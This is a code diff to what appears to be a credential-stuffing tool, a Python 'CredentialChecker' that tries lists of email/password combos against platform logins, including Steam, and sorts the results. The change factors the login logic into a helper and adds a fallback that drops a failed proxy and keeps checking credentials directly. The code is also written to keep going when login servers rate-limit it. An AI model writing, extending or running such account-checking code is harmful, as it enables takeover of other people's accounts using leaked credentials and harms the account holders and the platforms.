@@ -38,6 +38,7 @@ class CredentialChecker:
         self._semaphores: dict[str, asyncio.Semaphore] = {}
         self._rate_limiters: dict[str, float] = {}
         self._session_mgr = SessionManager()
+        self._proxy_failed = False
 
     def stop(self):
         self._stop_flag = True
@@ -82,68 +83,20 @@ class CredentialChecker:
                 await self._session_mgr.get_session_cookies(session, platform)
                 proxy = self.proxy or None
 
-                if platform.auth_type == "steam":
-                    rsa_data = await steam_auth.get_rsa_key(session, email, proxy)
-                    if not rsa_data.get("publickey_mod"):
-                        return ResultStatus.ERROR, "Failed to get RSA key"
-                    encrypted_pw = steam_auth.encrypt_password(rsa_data, password)
-                    payload = steam_auth.build_steam_payload(
-                        email, encrypted_pw, rsa_data["timestamp"]
-                    )
-                    data = urlencode(payload)
-                    headers = dict(platform.headers)
-                    headers["Content-Type"] = "application/x-www-form-urlencoded"
-
-                    for attempt in range(MAX_RETRIES_429 + 1):
-                        if self._stop_flag:
-                            return ResultStatus.ERROR, "Stopped"
-                        status, text, headers_resp, location = await self._send_request(
-                            session, platform, data, headers, proxy
-                        )
-                        if status == 429:
-                            retry_after = int(headers_resp.get("Retry-After", 5))
-                            if attempt < MAX_RETRIES_429:
-                                wait = retry_after * (RETRY_BACKOFF_BASE ** attempt)
-                                self._rate_limiters[platform.name] = time.time() + wait
-                                await asyncio.sleep(wait)
-                                continue
-                            return ResultStatus.RATE_LIMITED, f"HTTP 429 after {MAX_RETRIES_429} retries"
-                        break
-
-                    return steam_auth.parse_steam_response(text)
+                if proxy and not self._proxy_failed:
+                    try:
+                        result = await self._try_check(session, email, password, platform, proxy)
+                        if result[0] == ResultStatus.ERROR:
+                            self._proxy_failed = True
+                            logger.warning(f"Proxy failed, falling back to direct: {result[1]}")
+                            result = await self._try_check(session, email, password, platform, None)
+                        return result
+                    except (aiohttp.ClientConnectionError, aiohttp.ClientError, OSError):
+                        self._proxy_failed = True
+                        logger.warning("Proxy connection failed, falling back to direct")
+                        return await self._try_check(session, email, password, platform, None)
                 else:
-                    payload = platform.build_payload(email, password)
-                    headers = dict(platform.headers)
-
-                    if platform.auth_type == "json":
-                        data = json.dumps(payload)
-                        headers["Content-Type"] = "application/json"
-                    else:
-                        data = urlencode(payload)
-                        headers["Content-Type"] = "application/x-www-form-urlencoded"
-
-                    for attempt in range(MAX_RETRIES_429 + 1):
-                        if self._stop_flag:
-                            return ResultStatus.ERROR, "Stopped"
-
-                        status, text, headers_resp, location = await self._send_request(
-                            session, platform, data, headers, proxy
-                        )
-
-                        if status == 429:
-                            retry_after = int(headers_resp.get("Retry-After", 5))
-                            if attempt < MAX_RETRIES_429:
-                                wait = retry_after * (RETRY_BACKOFF_BASE ** attempt)
-                                logger.warning(f"[{platform.name}] 429 - retry in {wait}s "
-                                               f"(attempt {attempt + 1}/{MAX_RETRIES_429})")
-                                self._rate_limiters[platform.name] = time.time() + wait
-                                await asyncio.sleep(wait)
-                                continue
-                            return ResultStatus.RATE_LIMITED, f"HTTP 429 after {MAX_RETRIES_429} retries"
-
-                        break
-
-                    return classify_response(status, text, headers_resp, location, platform)
+                    return await self._try_check(session, email, password, platform, None)
 
             except asyncio.TimeoutError:
                 if self.ignore_timeouts:
@@ -156,9 +109,76 @@ class CredentialChecker:
             except Exception as e:
                 return ResultStatus.ERROR, f"Unexpected: {str(e)[:50]}"
 
+    async def _try_check(self, session: aiohttp.ClientSession,
+                         email: str, password: str,
+                         platform: Platform, proxy: Optional[str]) -> tuple[str, str]:
+        if platform.auth_type == "steam":
+            rsa_data = await steam_auth.get_rsa_key(session, email, proxy)
+            if not rsa_data.get("publickey_mod"):
+                return ResultStatus.ERROR, "Failed to get RSA key"
+            encrypted_pw = steam_auth.encrypt_password(rsa_data, password)
+            payload = steam_auth.build_steam_payload(
+                email, encrypted_pw, rsa_data["timestamp"]
+            )
+            data = urlencode(payload)
+            headers = dict(platform.headers)
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+
+            for attempt in range(MAX_RETRIES_429 + 1):
+                if self._stop_flag:
+                    return ResultStatus.ERROR, "Stopped"
+                status, text, headers_resp, location = await self._send_request(
+                    session, platform, data, headers, proxy
+                )
+                if status == 429:
+                    retry_after = int(headers_resp.get("Retry-After", 5))
+                    if attempt < MAX_RETRIES_429:
+                        wait = retry_after * (RETRY_BACKOFF_BASE ** attempt)
+                        self._rate_limiters[platform.name] = time.time() + wait
+                        await asyncio.sleep(wait)
+                        continue
+                    return ResultStatus.RATE_LIMITED, f"HTTP 429 after {MAX_RETRIES_429} retries"
+                break
+
+            return steam_auth.parse_steam_response(text)
+        else:
+            payload = platform.build_payload(email, password)
+            headers = dict(platform.headers)
+
+            if platform.auth_type == "json":
+                data = json.dumps(payload)
+                headers["Content-Type"] = "application/json"
+            else:
+                data = urlencode(payload)
+                headers["Content-Type"] = "application/x-www-form-urlencoded"
+
+            for attempt in range(MAX_RETRIES_429 + 1):
+                if self._stop_flag:
+                    return ResultStatus.ERROR, "Stopped"
+
+                status, text, headers_resp, location = await self._send_request(
+                    session, platform, data, headers, proxy
+                )
+
+                if status == 429:
+                    retry_after = int(headers_resp.get("Retry-After", 5))
+                    if attempt < MAX_RETRIES_429:
+                        wait = retry_after * (RETRY_BACKOFF_BASE ** attempt)
+                        logger.warning(f"[{platform.name}] 429 - retry in {wait}s "
+                                       f"(attempt {attempt + 1}/{MAX_RETRIES_429})")
+                        self._rate_limiters[platform.name] = time.time() + wait
+                        await asyncio.sleep(wait)
+                        continue
+                    return ResultStatus.RATE_LIMITED, f"HTTP 429 after {MAX_RETRIES_429} retries"
+
+                break
+
+            return classify_response(status, text, headers_resp, location, platform)
+
     async def run_test(self, combos: list, platforms: list,
                        progress_interval: float = PROGRESS_UPDATE_INTERVAL):
         self._stop_flag = False
+        self._proxy_failed = False
         total = len(combos) * len(platforms)
         completed = 0
         start_time = time.time()
